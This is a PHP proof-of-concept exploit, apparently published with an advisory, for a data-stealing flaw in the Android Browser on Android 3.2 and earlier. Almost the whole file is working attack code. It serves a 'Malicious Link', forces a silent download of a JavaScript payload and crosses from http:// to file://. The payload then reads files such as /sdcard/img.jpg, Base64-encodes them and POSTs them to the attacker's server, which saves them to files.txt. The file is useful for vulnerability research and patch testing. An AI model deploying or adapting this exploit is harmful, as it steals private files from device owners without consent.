<?php
/*
* Description:  Android Cross Protocol redirect to execute javascript in context of local
* Vulns:        1) Auto download of file - used in CVE-2010-4804 by Thomas Cannon
*               2) Javascript in local HTML files can cross protocol and domains - used in CVE-2010-4804 by Thomas Cannon
*               3) Using an iframe + redirect to allow crossing from http:// to file:// - published on 08-Feb-2011 by www.80vul.com
* Affected:     Android <= 3.2
*               Android >=4.0 did not allow redirecting to file:// by sending a header in testing
* Author:       Thomas Cannon
* Advisory:     (For vulns 1 & 2) : http://thomascannon.net/blog/2010/11/android-data-stealing-vulnerability/
*                                   http://www.exploit-db.com/exploits/18164/
*               (For vuln 3, and more on 1 & 2) : http://www.80vul.com/android/android-0days.txt
*
* Filename:     poc2.php
* Instructions: Specify files you want to upload in filenames array. Host this php file
*               on a server and visit it using the Android Browser. Some builds of Android
*               may require adjustments to the script, e.g. because payload downloads as .htm instead of .html
*
* Tested on:    Android 2.3 & Android 3.2 (Emulators)
*/
//  List of the files on the device that we want to upload to our server
$filenames = array("/proc/version", "/sdcard/img.jpg");
//  Determine the full URL of this script
$protocol = $_SERVER["HTTPS"] == "on" ? "https" : "http";
$scripturl = $protocol."://".$_SERVER["HTTP_HOST"].$_SERVER["SCRIPT_NAME"];
//  Stage 0:  Display introduction text and a link to start the PoC.
function stage0($scripturl) {
  echo "<b>Android <= 3.2</b><br>Data Stealing Web Page<br><br>Click: <a href=\"$scripturl?stage=1\">Malicious Link</a>";
}
//  Stage 1:  Redirect to Stage 2 which will force a download of the HTML/JS payload, then a few seconds later redirect
//            to the payload. We load the payload using by using an iframe to allow the browser to jump protocols from http:// to file://
//            The JavaScript in the payload is then executed in the context of the local device.
function stage1($scripturl) {
  echo "<body onload=\"setTimeout('window.location=\'$scripturl?stage=2\'',1000);\"><iframe name=f src='$scripturl?stage=cross-protocol'></iframe><script>function init(){f.location = \"file:///sdcard/download/poc.html\";}setTimeout(init,6000);</script>";
}
//  Stage 2:  Download of payload, the Android browser doesn't prompt for the download which is another vulnerability.
//            The payload uses AJAX calls to read file contents and encodes as Base64, then uploads to server (Stage 3).
function stage2($scripturl,$filenames) {
  header("Cache-Control: public");
  header("Content-Description: File Transfer");
  header("Content-Disposition: attachment; filename=poc.html");
  header("Content-Type: text/html");
  header("Content-Transfer-Encoding: binary");
?>
<html>
  <body>
    <script language='javascript'>
      var filenames = Array('<?php echo implode("','",$filenames); ?>');
      var filecontents = new Array();
      function processBinary(xmlhttp) {
        data = xmlhttp.responseText;    r = '';   size = data.length;
        for(var i = 0; i < size; i++)   r += String.fromCharCode(data.charCodeAt(i) & 0xff);
        return r;
      }
      function getFiles(filenames) {
        for (var filename in filenames) {
          filename = filenames[filename];
          xhr = new XMLHttpRequest();
          xhr.open('GET', filename, false);
          xhr.overrideMimeType('text/plain; charset=x-user-defined');
          xhr.onreadystatechange = function() { if (xhr.readyState == 4) { filecontents[filename] = btoa(processBinary(xhr)); } }
          xhr.send();
        }
      }
      function addField(form, name, value) {
        var fe = document.createElement('input');
        fe.setAttribute('type', 'hidden');
        fe.setAttribute('name', name);
        fe.setAttribute('value', value);
        form.appendChild(fe);
      }
      function uploadFiles(filecontents) {
        var form = document.createElement('form');
        form.setAttribute('method', 'POST');
        form.setAttribute('enctype', 'multipart/form-data');
        form.setAttribute('action', '<?=$scripturl?>?stage=3');
        var i = 0;
        for (var filename in filecontents) {
          addField(form, 'filename'+i, btoa(filename));
          addField(form, 'data'+i, filecontents[filename]);
          i += 1;
        }
        document.body.appendChild(form);
        form.submit();
      }
      getFiles(filenames);
      uploadFiles(filecontents);
    </script>
  </body>
</html>
<?php
}
//  Stage 3:  Read the file names and contents sent by the payload and write to a file on the server.
function stage3() {
  $fp = fopen("files.txt", "w") or die("Couldn't open file for writing!");
  fwrite($fp, print_r($_POST, TRUE)) or die("Couldn't write data to file!");
  fclose($fp);
  echo "Data uploaded to <a href=\"files.txt\">files.txt</a>!";
}
//  Cross protocol:  Allow the browser to jump from http:// to file://.
function crossProtocol() {
  header("Location:file:///");
}
//  Select the stage to run depending on the parameter passed in the URL
switch($_GET["stage"]) {
  case "1":
    stage1($scripturl);
    break;
  case "2":
    stage2($scripturl,$filenames);
    break;
  case "3":
    stage3();
    break;
  case "cross-protocol":
    crossProtocol();
    break;
  default:
    stage0($scripturl);
    break;
}
?>
